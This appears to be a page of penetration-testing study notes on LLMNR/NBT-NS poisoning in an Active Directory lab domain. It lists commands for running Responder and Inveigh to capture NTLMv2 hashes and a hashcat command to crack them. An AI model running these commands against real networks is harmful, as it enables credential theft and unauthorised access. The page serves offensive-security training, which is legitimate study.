---
title: "Sniffing a Foothold"
Description: 
draft: false
images: []
menu:
  docs:
    parent: "Active Directory"
weight: 2
toc: true
---

### <span style="color:#208355"> Quick Example - LLMNR/NBT-NS Poisoning

Let's walk through a quick example of the attack flow at a very high level:

```bash
1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
```
### <span style="color:#208355"> LLMNR/NBT-NS Poisoning - from Linux

<span style="color:#208355"><a href="https://github.com/lgandx/Responder" target="_blank">Responder</a></span> will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the /usr/share/responder/logs directory.

```
sudo responder -I ens224 
```
### <span style="color:#208355"> LLMNR/NBT-NS Poisoning - from Windows

The tool <span style="color:#208355"><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank">Inveigh</a></span> works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.

Powershell:
```
PS C:\kryot> Import-Module .\Inveigh.ps1
PS C:\kryot> (Get-Command Invoke-Inveigh).Parameters
PS C:\kryot> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
C# Inveigh:
```
PS C:\kryot> .\Inveigh.exe

GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
HELP
```

### <span style="color:#208355"> Cracking an NTLMv2
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
```